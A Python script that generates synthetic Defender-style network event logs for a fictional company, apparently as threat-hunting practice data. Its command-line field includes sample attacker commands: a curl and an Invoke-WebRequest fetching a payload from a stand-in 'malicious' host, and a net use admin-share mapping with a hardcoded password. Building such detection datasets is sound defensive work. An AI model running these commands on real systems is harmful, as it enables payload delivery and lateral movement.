
import os, json, random
from datetime import datetime, timedelta
from faker import Faker
from collections import OrderedDict

output_dir = "C:\\Output"
os.makedirs(output_dir, exist_ok=True)
fake = Faker()

def random_hex(n): return ''.join(random.choices('0123456789abcdef', k=n))

def action_specific_fields(action):
    if action == "DnsQuery":
        return {
            "RemotePort": 53,
            "Protocol": "UDP",
            "RemoteUrl": "dns.kustoindustries.net",
            "AdditionalFields": json.dumps({
                "dnsFlags": "standard",
                "queryType": "A"
            })
        }
    elif action == "HttpRequest":
        return {
            "RemotePort": 443,
            "Protocol": "TCP",
            "RemoteUrl": "malicious.kustoindustries.net/login",
            "AdditionalFields": json.dumps({
                "httpMethod": random.choice(["GET", "POST"]),
                "userAgent": "curl/7.68.0"
            })
        }
    elif action == "SmbConnection":
        return {
            "RemotePort": 445,
            "Protocol": "TCP",
            "RemoteUrl": "",
            "AdditionalFields": json.dumps({
                "smbDialect": "3.1.1",
                "signed": True
            })
        }
    elif action == "LdapBind":
        return {
            "RemotePort": 389,
            "Protocol": "TCP",
            "RemoteUrl": "",
            "AdditionalFields": json.dumps({
                "ldapAuthType": "Simple"
            })
        }
    else:  # default fallback for ConnectionRequest/Success/Failed
        return {
            "RemotePort": 3389,
            "Protocol": "TCP",
            "RemoteUrl": "",
            "AdditionalFields": json.dumps({
                "connectionFlags": random.choice(["SYN", "ACK", "RST"])
            })
        }

def generate_event(ts):
    record = OrderedDict()
    action = random.choice([
        "DnsQuery", "HttpRequest", "ConnectionRequest",
        "ConnectionSuccess", "SmbConnection", "LdapBind"
    ])
    action_fields = action_specific_fields(action)

    record["ActionType"] = action
    record["AdditionalFields"] = action_fields["AdditionalFields"]
    record["AppGuardContainerId"] = str(fake.uuid4())
    record["DeviceId"] = str(fake.uuid4())
    record["DeviceName"] = random.choice(["DC-AD-01", "FN-WKSTN-001"])
    record["InitiatingProcessAccountDomain"] = "KustoIndustries"
    record["InitiatingProcessAccountName"] = fake.user_name()
    record["InitiatingProcessAccountObjectId"] = str(fake.uuid4())
    record["InitiatingProcessAccountSid"] = "S-1-5-21-" + "-".join(str(random.randint(1000000000,9999999999)) for _ in range(3))
    record["InitiatingProcessAccountUpn"] = fake.email()
    record["InitiatingProcessCommandLine"] = random.choice([
        "curl http://malicious.kustoindustries.net/login",
        "Invoke-WebRequest -Uri http://malicious.kustoindustries.net/payload.ps1",
        "net use \\10.0.0.4\C$ /user:admin password123"
    ])
    record["InitiatingProcessCreationTime"] = ts.isoformat()
    record["InitiatingProcessFileName"] = "powershell.exe"
    record["InitiatingProcessFileSize"] = random.randint(10000, 100000)
    record["InitiatingProcessFolderPath"] = "C:\\Windows\\System32"
    record["InitiatingProcessId"] = random.randint(1000, 9999)
    record["InitiatingProcessIntegrityLevel"] = "High"
    record["InitiatingProcessMD5"] = random_hex(32)
    record["InitiatingProcessParentCreationTime"] = ts.isoformat()
    record["InitiatingProcessParentFileName"] = "explorer.exe"
    record["InitiatingProcessParentId"] = random.randint(1000, 9999)
    record["InitiatingProcessRemoteSessionDeviceName"] = ""
    record["InitiatingProcessRemoteSessionIP"] = ""
    record["InitiatingProcessSessionId"] = random.randint(100000, 999999)
    record["InitiatingProcessSHA1"] = random_hex(40)
    record["InitiatingProcessSHA256"] = random_hex(64)
    record["InitiatingProcessTokenElevation"] = "TokenElevationTypeFull"
    record["InitiatingProcessUniqueId"] = str(fake.uuid4())
    record["InitiatingProcessVersionInfoCompanyName"] = "Microsoft Corporation"
    record["InitiatingProcessVersionInfoFileDescription"] = "Windows PowerShell"
    record["InitiatingProcessVersionInfoInternalFileName"] = "powershell.exe"
    record["InitiatingProcessVersionInfoOriginalFileName"] = "powershell.exe"
    record["InitiatingProcessVersionInfoProductName"] = "Microsoft Windows Operating System"
    record["InitiatingProcessVersionInfoProductVersion"] = "10.0.19041.1"
    record["IsInitiatingProcessRemoteSession"] = False
    record["LocalIP"] = fake.ipv4_private()
    record["LocalIPType"] = "Private"
    record["LocalPort"] = random.randint(1024, 65535)
    record["MachineGroup"] = "UnassignedGroup"
    record["Protocol"] = action_fields["Protocol"]
    record["RemoteIP"] = fake.ipv4_public()
    record["RemoteIPType"] = "Public"
    record["RemotePort"] = action_fields["RemotePort"]
    record["RemoteUrl"] = action_fields["RemoteUrl"]
    record["ReportId"] = random.randint(100000, 999999)
    record["SourceSystem"] = ""
    record["TenantId"] = "d63f3f4b-6e5b-4e10-a8b8-2d7e2a8b5f72"
    record["TimeGenerated"] = datetime.utcnow().isoformat()
    record["Timestamp"] = ts.isoformat()
    record["Type"] = "DeviceNetworkEvents"
    return record

def generate_events(count=100):
    base = datetime.utcnow()
    delta = timedelta(seconds=45)
    with open(os.path.join(output_dir, "device_network_events.json"), "w", encoding="utf-8") as f:
        for i in range(count):
            ts = base - i * delta
            f.write(json.dumps(generate_event(ts)) + "\n")

if __name__ == "__main__":
    generate_events()
